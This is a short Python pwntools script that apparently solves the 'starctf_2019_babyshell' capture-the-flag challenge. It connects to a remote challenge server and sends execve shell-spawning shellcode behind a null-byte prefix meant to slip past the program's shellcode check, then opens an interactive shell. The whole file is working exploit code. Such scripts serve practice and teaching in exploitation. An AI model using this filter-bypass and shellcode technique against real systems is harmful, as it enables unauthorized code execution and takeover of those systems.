from pwn import *

context(os = 'linux', arch = 'amd64', log_level = 'debug')
# io = process('starctf_2019_babyshell')
io = remote('node4.buuoj.cn', 28485)
# libc = ELF('/lib/i386-linux-gnu/libc.so.6')
# libc = ELF('libc-2.23.so')
elf = ELF('starctf_2019_babyshell')

shellcode = asm(shellcraft.sh())
payload = b'\x00\x4a\x00' + shellcode
io.sendlineafter('give me shellcode, plz:\n', payload)
io.interactive()
